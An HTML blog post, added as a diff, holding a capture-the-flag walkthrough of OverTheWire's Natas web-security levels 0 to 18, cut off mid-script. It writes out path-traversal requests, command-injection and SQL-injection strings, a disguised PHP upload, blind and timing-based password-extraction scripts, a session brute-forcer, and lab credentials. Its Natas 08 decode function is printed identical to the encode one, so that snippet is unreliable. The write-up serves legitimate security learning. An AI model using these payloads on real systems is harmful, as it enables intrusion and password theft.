@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<!--
+    So Simple Jekyll Theme 3.2.0
+    Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+    Free for personal and commercial use under the MIT license
+    https://github.com/mmistakes/so-simple-theme/blob/master/LICENSE
+-->
+<html lang="en-US" class="no-js">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  
+
+  
+    
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Natas CTF | Cloud Castle Chaos</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Natas CTF" />
+<meta name="author" content="P2" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF by OverTheWire @ https://overthewire.org/wargames/natas/ This OverTheWire CTF teaches the basics of serverside web-security. There is no need to install anything, each level of consists of its own website." />
+<meta property="og:description" content="CTF by OverTheWire @ https://overthewire.org/wargames/natas/ This OverTheWire CTF teaches the basics of serverside web-security. There is no need to install anything, each level of consists of its own website." />
+<link rel="canonical" href="http://localhost:4000/ctf/2023/11/03/Natas.html" />
+<meta property="og:url" content="http://localhost:4000/ctf/2023/11/03/Natas.html" />
+<meta property="og:site_name" content="Cloud Castle Chaos" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-11-03T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Natas CTF" />
+<meta name="twitter:site" content="@mmistakes" />
+<meta name="twitter:creator" content="@P2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"P2"},"dateModified":"2023-11-03T00:00:00+01:00","datePublished":"2023-11-03T00:00:00+01:00","description":"CTF by OverTheWire @ https://overthewire.org/wargames/natas/ This OverTheWire CTF teaches the basics of serverside web-security. There is no need to install anything, each level of consists of its own website.","headline":"Natas CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf/2023/11/03/Natas.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/images/logo.png"},"name":"P2"},"url":"http://localhost:4000/ctf/2023/11/03/Natas.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  
+
+  <script>
+    /* Cut the mustard */
+    if ( 'querySelector' in document && 'addEventListener' in window ) {
+      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + 'js';
+    }
+  </script>
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/skins/default.css">
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,700,700i|Lora:400,400i,700,700i">
+  <link rel="alternate" type="application/atom+xml" title="Cloud Castle Chaos" href="/atom.xml">
+<!-- start custom head snippets -->
+
+<!-- insert favicons. use http://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+</head>
+
+
+  <body class="layout--post  natas-ctf">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#primary-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+  <div class="navigation-wrapper">
+    <a href="#menu-toggle" id="menu-toggle">Menu</a>
+    <nav id="primary-nav" class="site-nav animated drop">
+      <ul><li><a href="/posts/">Posts</a></li><li><a href="/categories/">Categories</a></li><li><a href="/search/">Search</a></li></ul>
+    </nav>
+  </div><!-- /.navigation-wrapper -->
+
+
+    <header class="masthead">
+  <div class="wrap">
+    
+      <a href="/" class="site-logo" rel="home" title="Cloud Castle Chaos">
+        <img src="/images/logo.png" class="site-logo-img animated fadeInDown" alt="Cloud Castle Chaos">
+      </a>
+    
+    
+    
+      
+        <div class="site-description animated fadeIn"><a href="/">a bit of this. a bit of that.</a></div>
+      
+    
+  </div>
+</header><!-- /.masthead -->
+
+    <main id="main" class="main-content" aria-label="Content">
+  <article class="h-entry">
+    
+
+    <div class="page-wrapper">
+      <header class="page-header">
+        
+        
+          <h1 id="page-title" class="page-title p-name">Natas CTF
+</h1>
+        
+      </header>
+
+      <div class="page-sidebar">
+        <div class="page-author h-card p-author"><img src="/images/profile.png" class="author-avatar u-photo" alt="P2"><div class="author-info"><div class="author-name">
+        <em>by</em> <span class="p-name">P2</span>
+      </div><ul class="author-links"><li class="author-link">
+            <a class="u-url" rel="me" href=""><i class="fas fa-link fa-lg" title=""></i></a>
+          </li></ul>
+
+<span class="read-time">16 min read</span>
+
+    <time class="page-date dt-published" datetime="2023-11-03T00:00:00+01:00"><a class="u-url" href="">November 3, 2023</a>
+</time>
+
+  </div>
+</div>
+
+        
+  <h3 class="page-taxonomies-title">Categories</h3>
+  
+  <ul class="page-taxonomies"><li class="page-taxonomy"><a class="p-category" href="/categories/#ctf" title="Pages filed under CTF">CTF</a></li>
+  </ul>
+
+
+        
+
+      </div>
+
+      <div class="page-content">
+        <div class="e-content">
+          <p><img src="https://cdn.pixabay.com/photo/2016/08/20/06/44/e-commerce-1606962_1280.png" alt="center-aligned-image" class="align-center" /></p>
+
+<p class="notice--info">CTF by <strong>OverTheWire</strong> @ <a href="https://overthewire.org/wargames/natas/">https://overthewire.org/wargames/natas/</a></p>
+
+<p>This OverTheWire CTF teaches the basics of serverside web-security. There is no need to install anything, each level of consists of its own website.</p>
+
+<!--more-->
+
+<table>
+  <thead>
+    <tr>
+      <th>Content:</th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#install">Install</a></td>
+      <td><a href="#natas-06">Natas 06</a></td>
+      <td><a href="#natas-13">Natas 13</a></td>
+      <td><a href="#natas-20">Natas 20</a></td>
+      <td><a href="#natas-27">Natas 27</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td><a href="#natas-00">Natas 00</a></td>
+      <td><a href="#natas-07">Natas 07</a></td>
+      <td><a href="#natas-14">Natas 14</a></td>
+      <td><a href="#natas-21">Natas 21</a></td>
+      <td><a href="#natas-28">Natas 28</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td><a href="#natas-01">Natas 01</a></td>
+      <td><a href="#natas-08">Natas 08</a></td>
+      <td><a href="#natas-15">Natas 15</a></td>
+      <td><a href="#natas-22">Natas 22</a></td>
+      <td><a href="#natas-29">Natas 29</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td><a href="#natas-02">Natas 02</a></td>
+      <td><a href="#natas-09">Natas 09</a></td>
+      <td><a href="#natas-16">Natas 16</a></td>
+      <td><a href="#natas-23">Natas 23</a></td>
+      <td><a href="#natas-30">Natas 30</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td><a href="#natas-03">Natas 03</a></td>
+      <td><a href="#natas-10">Natas 10</a></td>
+      <td><a href="#natas-17">Natas 17</a></td>
+      <td><a href="#natas-24">Natas 24</a></td>
+      <td><a href="#natas-31">Natas 31</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td><a href="#natas-04">Natas 04</a></td>
+      <td><a href="#natas-11">Natas 11</a></td>
+      <td><a href="#natas-18">Natas 18</a></td>
+      <td><a href="#natas-25">Natas 25</a></td>
+      <td><a href="#natas-32">Natas 32</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td><a href="#natas-05">Natas 05</a></td>
+      <td><a href="#natas-12">Natas 12</a></td>
+      <td><a href="#natas-19">Natas 19</a></td>
+      <td><a href="#natas-26">Natas 26</a></td>
+      <td><a href="#natas-33">Natas 33</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="capture-the-flag">Capture the Flag</h1>
+
+<h3 id="install">[Install]</h3>
+<p>All the challenges can be accessed with the browser at the following website. You will find the passwords along the way: <br />
+<code class="language-plaintext highlighter-rouge">http://natasX.natas.labs.overthewire.org</code> \ <br />
+All the flags are in <code class="language-plaintext highlighter-rouge">/etc/natas_webpass/</code>, so those are the files we should aim to read in each level. Obviously, we need to gain the right permissions first. <br />
+For this challenges, installing the BurpSuite proxy is a really good idea.</p>
+
+<h3 id="natas-00">[Natas 00]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas0.natas.labs.overthewire.org</code> <br />
+User:Password: natas0:natas0</p>
+
+<p>Just look at the source of the page… Right click or Ctrl+u, if you want the shortcut.</p>
+
+<h3 id="natas-01">[Natas 01]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas1.natas.labs.overthewire.org</code> <br />
+Just look at the source of the page… No right click, so Ctrl+u is the way to go.</p>
+
+<h3 id="natas-02">[Natas 02]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas2.natas.labs.overthewire.org</code> <br />
+The source of the page doesn’t contain the flag, but it shows that there is an image stored under <code class="language-plaintext highlighter-rouge">/files</code>. <br />
+We can access the <code class="language-plaintext highlighter-rouge">/files folder</code> just by putting the path in the url: <code class="language-plaintext highlighter-rouge">http://natas2.natas.labs.overthewire.org/files</code> <br />
+From here, we see that there is a users.txt file, and accessing it gives the flag: <code class="language-plaintext highlighter-rouge">http://natas2.natas.labs.overthewire.org/files/users.txt</code></p>
+
+<h3 id="natas-03">[Natas 03]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas3.natas.labs.overthewire.org</code> <br />
+The source of the page doesn’t contain the flag, but has a hint: Google is not allowed to find the solution. This points us to the <code class="language-plaintext highlighter-rouge">robots.txt file</code>: in this file are listed the folders that crawlers are allowed or not allowed to visit. <br />
+So in <code class="language-plaintext highlighter-rouge">http://natas3.natas.labs.overthewire.org/robots.txt</code> we discover a folder called <code class="language-plaintext highlighter-rouge">/s3cr3t</code>, and visiting it reveals again a users.txt file with the flag at <code class="language-plaintext highlighter-rouge">http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt</code>.</p>
+
+<h3 id="natas-04">[Natas 04]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas4.natas.labs.overthewire.org</code> <br />
+The page complains about where your request is coming from. This is a parameter that HTTP requests hold in the header, and to change it we have to intercept the request with the proxy. <br />
+After starting Burp and setting up the proxy, we deactivate interception and load the page a couple of times. On refreshing, the page will tell you where you came from. <br />
+It’s time to activate the Burp interception and refresh once again: the request will be trapped, and we can move it to the repeater. There we modify the referer so that it corresponds to the one the pages wishes: <code class="language-plaintext highlighter-rouge">http://natas5.natas.labs.overthewire.org</code>. <br />
+Send the modified request, and enjoy the flag.</p>
+
+<h3 id="natas-05">[Natas 05]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas5.natas.labs.overthewire.org</code> <br />
+This time the page complains that you are not logged in. If we intercept the page with Burp, we see that one of the cookie parameters is ‘loggedin’ and is set to 0. \ If we move the request to the repeater, modify that value to 1 and send it again, we will get the flag.</p>
+
+<h3 id="natas-06">[Natas 06]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas6.natas.labs.overthewire.org</code> <br />
+No need of proxy for this one, looking at the provided link with the php source is enough: we can’t find out the secret directly because it is hidden by a variable name, but we see that that variable is defined in <code class="language-plaintext highlighter-rouge">/includes/secret.inc</code>. 
+We visit the page <code class="language-plaintext highlighter-rouge">http://natas6.natas.labs.overthewire.org/includes/secret.inc</code> and look at the source, and there is our secret. <br />
+We can now submit it in the challenge page and get the flag.</p>
+
+<h3 id="natas-07">[Natas 07]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas7.natas.labs.overthewire.org</code> <br />
+Not much to see, but the source tells us that our target should be the password file in <code class="language-plaintext highlighter-rouge">/etc/natas_webpass/natas8</code>. <br />
+After clicking on home and about, we see that the target page is passed as GET parameter. We just have to do the same with our file: <code class="language-plaintext highlighter-rouge">http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8</code></p>
+
+<h3 id="natas-08">[Natas 08]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas8.natas.labs.overthewire.org</code> <br />
+Similarly to challenge 06, we have to pass a secret to get the key. However, this time the secret is directly in the source file, in an encrypted form. <br />
+Luckily, we also have the encrypting method, and we can reverse it:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">encode</span><span class="p">(</span><span class="err">$</span><span class="n">secret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="n">bin2hex</span><span class="p">(</span><span class="n">strrev</span><span class="p">(</span><span class="n">base64_encode</span><span class="p">(</span><span class="err">$</span><span class="n">secret</span><span class="p">)));}</span> 
+<span class="n">decode</span><span class="p">(</span><span class="err">$</span><span class="n">secret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="n">bin2hex</span><span class="p">(</span><span class="n">strrev</span><span class="p">(</span><span class="n">base64_encode</span><span class="p">(</span><span class="err">$</span><span class="n">secret</span><span class="p">)));}</span>
+</code></pre></div></div>
+<p>You can execute the code online with a service like PHP Sandbox</p>
+
+<h3 id="natas-09">[Natas 09]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas9.natas.labs.overthewire.org</code> <br />
+Looking at the source of this challenge, we can see that PHP lovely executes whatever we pass as input using the command <code class="language-plaintext highlighter-rouge">passthru</code>.<br />
+We just have to give it something to grep and append a command to our password file to have it printed out.<br />
+Our search string will be: <code class="language-plaintext highlighter-rouge">adsfasdf dictionary.txt; cat /etc/natas_webpass/natas10;</code></p>
+
+<h3 id="natas-10">[Natas 10]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas10.natas.labs.overthewire.org</code> <br />
+The challenge is exactly the same as level 9, but some special characters are blacklisted.<br />
+URL encoding the search string is not enough, so we have to trick the command in another way. <br />
+What we can do is tell grep to use the -e option to look for a pattern we know exists in our own target file, and not care about what happens with the dictionary: <code class="language-plaintext highlighter-rouge">-e '' /etc/natas_webpass/natas11</code></p>
+
+<h3 id="natas-11">[Natas 11]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas11.natas.labs.overthewire.org</code> <br />
+This challenge requires a bit of manual work to find out how to encrypt the cookie. We know that the encryption is XOR based, meaning that if we have cleartext and cryptotext we can retrieve the key by xoring them together. <br />
+We obtain the encryption algorithm <code class="language-plaintext highlighter-rouge">xor_encrypt</code> and the cleartext <code class="language-plaintext highlighter-rouge">$defaultdata</code> from the source code. <br />
+We get the cryptotext by intercepting a request with burp and extracting the data from the cookie. <br />
+Remember to first <code class="language-plaintext highlighter-rouge">base64_decrypt</code> the cookie content and to echo it in hex using for example <code class="language-plaintext highlighter-rouge">bin2hex</code>. <br />
+After this we can start xoring each character of the clear and crypto texts to get the key characters. After 4 chars it starts repeating, so we know that we have the key. <br />
+We can now plug the key into the encryption algorithm, modify the default cookie so that <code class="language-plaintext highlighter-rouge">showpassword</code> is yes, and run the script to get the newly encoded cookie. With it, we can resend the request and get the flag.</p>
+
+<h3 id="natas-12">[Natas 12]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas12.natas.labs.overthewire.org</code> <br />
+So the upload system takes our file, puts it somewhere without much of a check about what it is, and gives us back a link. <br />
+First idea is to directly upload a php file that echoes back the password file. However, the file is saved in a jpg format and therefore not interpreted. <br />
+Luckily, the format can be changed client side: with the developer tools in the browser we can look for the form input tags and set the file extension form jpg to php, and now clicking on the link will give back the flag.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$homepage</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/etc/natas_webpass/natas13'</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$homepage</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h3 id="natas-13">[Natas 13]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas13.natas.labs.overthewire.org</code> <br />
+The first part of this challenge is exactly the same as before: create the php file, modify the form input field and profit. <br />
+However, before profiting there is one additional step: the source code actually checks that we are really uploading a jpg file. <br />
+To convince the server that we are playing fair, we can mask our php file as a jpg using magic numbers: these are numbers that are usually at the start of a file and identify its type. For jpg, the value is 0xFFD8FFDB. <br />
+It is enough to open our php file with a hex editor and literally prepend it with these bytes to be able to upload it without problems.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$homepage</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/etc/natas_webpass/natas14'</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nv">$homepage</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h3 id="natas-14">[Natas 14]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas14.natas.labs.overthewire.org</code> <br />
+Looking at the source code, this challenge is a clear SQL injection. <br />
+We know that the query is</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="n">query</span> <span class="o">=</span> <span class="nv">"SELECT * 
+        from users 
+        where username=</span><span class="se">\"</span><span class="nv">"</span><span class="p">.</span><span class="err">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="nv">"username"</span><span class="p">].</span><span class="nv">"</span><span class="se">\"</span><span class="nv"> and password=</span><span class="se">\"</span><span class="nv">"</span><span class="p">.</span><span class="err">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="nv">"password"</span><span class="p">].</span><span class="nv">"</span><span class="se">\"</span><span class="nv">"</span><span class="p">;</span>
+</code></pre></div></div>
+<p>We want to inject in the username so that the select will return content even if we don’t know the username and password. <br />
+What we have to do is close the user string with the quotes and put an OR clause that is always true; and then just comment out all the rest. <br />
+To note is that a comment can also be a double dash (–), but in that case it needs a space just afterwards to work properly. <br />
+This is the string that we use: <code class="language-plaintext highlighter-rouge">XXX" or "1"="1"; #</code></p>
+
+<h3 id="natas-15">[Natas 15]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas15.natas.labs.overthewire.org</code> <br />
+This challenge is a trickier version of SQL injection, because it is blind. This means that to get the information that we need we have to extrapolate it from other data. <br />
+In this case, we have to build the password char by char, using a query <code class="language-plaintext highlighter-rouge">like natas16" and password like binary 'x%'</code>.<br />
+We know that the ‘password’ column exists thanks to the comment in the source code, and with the ‘LIKE’ command we will get an answer only when the letters are correct (the % is a regex for ‘doesn’t matter what follows’). <br />
+We will use the Intruder from Burp, and start a sniper attack where we use our query with x as all the letters of the alphabet, both small and capital (we can distinguish thanks to the BINARY instruction), and numbers. <br />
+To identify the proper letter we check the length of the response. When we know the first letter, we move on changing the query as in <code class="language-plaintext highlighter-rouge">natas16" and password like 'Ax%'</code>. We will have to repeat this 32 times to get the entire flag: a python script comes in handy. The authorization and the other data comes from a request intercepted with Burp, copied as curl and translated to python by a service like cURL to Python</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">letters</span> <span class="o">=</span> <span class="sh">'</span><span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890</span><span class="sh">'</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">Authorization</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==</span><span class="sh">'</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="n">pwd</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="sh">'</span><span class="s">username=natas16</span><span class="sh">"</span><span class="s"> and password like binary </span><span class="sh">"'</span> <span class="o">+</span> <span class="n">pwd</span> <span class="o">+</span> <span class="n">l</span> <span class="o">+</span> <span class="sh">'</span><span class="s">%</span><span class="sh">"</span><span class="s">; #</span><span class="sh">'</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://natas15.natas.labs.overthewire.org</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sh">'</span><span class="s">exists</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">pwd</span> <span class="o">+=</span> <span class="n">l</span>
+            <span class="k">continue</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="natas-16">[Natas 16]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas16.natas.labs.overthewire.org</code> <br />
+We look back at challenges 09 and 10, but this time we are even more restricted in the characters that we are allowed to use. Interestingly, the dollar character is not filtered, and this allows us to executed some commands. What we will do is similar to the last challenge: a blind grep. <br />
+We first look for a string that only returns one word, like ‘doomed’. And then we append a grep command that will check if the password starts with the letter(s) that we are looking up in that iteration. If the letter sequence is right, than the result of the search will be empty; if the letter sequence is wrong, then we will be returned ‘doomed’.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">letters</span> <span class="o">=</span> <span class="sh">'</span><span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890</span><span class="sh">'</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">Authorization</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==</span><span class="sh">'</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="n">pwd</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
+
+        <span class="n">params</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="p">(</span><span class="sh">'</span><span class="s">needle</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">doomed$(grep ^</span><span class="sh">'</span> <span class="o">+</span> <span class="n">pwd</span> <span class="o">+</span> <span class="n">l</span> <span class="o">+</span> <span class="sh">'</span><span class="s"> /etc/natas_webpass/natas17)</span><span class="sh">'</span><span class="p">),</span>
+            <span class="p">(</span><span class="sh">'</span><span class="s">submit</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Search</span><span class="sh">'</span><span class="p">),</span>
+        <span class="p">)</span>
+
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://natas16.natas.labs.overthewire.org/index.php</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sh">'</span><span class="s">doomed</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">pwd</span> <span class="o">+=</span> <span class="n">l</span>
+            <span class="k">continue</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="natas-17">[Natas 17]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas17.natas.labs.overthewire.org</code> <br />
+Yet again a blind SQL injection. Main problem is, that we don’t have any output helping us detecting whether our guess is right or wrong. Instead, we can use timing: if our guess is right, wait 1 seconds before answering. <br />
+To achieve this behavior, we can use the following query: <code class="language-plaintext highlighter-rouge">username=natas18" and password like binary "' + pwd + l + '%" and sleep(1); #</code>. <br />
+Thanks to lazy execution (as soon as the value is known the evaluation stops, meaning that as soon as a clause of an AND is false the evaluation stops) the query will sleep only if our guess is right.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="n">letters</span> <span class="o">=</span> <span class="sh">'</span><span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890</span><span class="sh">'</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">Authorization</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==</span><span class="sh">'</span><span class="p">,</span>
+<span class="p">}</span>
+
+<span class="n">pwd</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="sh">'</span><span class="s">username=natas18</span><span class="sh">"</span><span class="s"> and password like binary </span><span class="sh">"'</span> <span class="o">+</span> <span class="n">pwd</span> <span class="o">+</span> <span class="n">l</span> <span class="o">+</span> <span class="sh">'</span><span class="s">%</span><span class="sh">"</span><span class="s"> and sleep(1); #</span><span class="sh">'</span>
+        <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://natas17.natas.labs.overthewire.org</span><span class="sh">'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="n">elapsed_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start_time</span>
+        <span class="k">if</span> <span class="n">elapsed_time</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">pwd</span> <span class="o">+=</span> <span class="n">l</span>
+            <span class="k">continue</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="natas-18">[Natas 18]</h3>
+<p><code class="language-plaintext highlighter-rouge">http://natas18.natas.labs.overthewire.org</code> <br />
+The trick is that the username and password do not matter! The authentication assigns you a session ID, and that is what is checked on the backend. <br />
+We can see in the source code that the pool of IDs is just up to 640, and therefore we can bruteforce them. <br />
+We intercept the request with Burp, translate it to python and go through all the possible values for the cookie, until we find one that tells us we are admin.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">application/x-www-form-urlencoded</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">Authorization</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==</span><span class="sh">'</span><span class="p">,</span>
+    <span class="p">}</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="sh">'</span><span class="s">username=admin&amp;password=xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</span><span class="sh">'</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">641</span><span class="p">):</span>
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">PHPSESSID</span><span class="sh">'</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span>
+    <span class="p">}</span>
+
